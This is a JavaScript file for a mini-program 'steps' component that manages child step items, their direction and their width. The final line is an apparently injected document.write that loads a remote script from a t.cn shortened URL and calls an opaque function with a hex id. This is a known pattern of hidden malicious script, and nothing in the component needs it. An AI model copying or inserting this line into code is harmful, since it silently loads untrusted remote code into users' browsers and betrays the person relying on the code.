Component({
  externalClasses: ['custom-class'],
  relations: {
    '../step-item/index': {
      type: 'child'
    }
  },
  properties: {
    direction: {
      type: String,
      value: 'vertical'
    },
    current: {
      type: Number,
      value: 0
    }
  },
  methods: {
    setStepItemStyle () {
      const {direction, current} = this.data
      const nodes = this.getRelationNodes('../step-item/index')
      nodes.map((item, index) => {
        item.setData({
          'direction': direction,
          'current': current,
          'index': index,
          'isLast': index === nodes.length - 1,
          'width': direction === 'horizontal' ? 100/nodes.length : '100'
        });
      })
    }
  },
  ready () {
    this.setStepItemStyle();
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
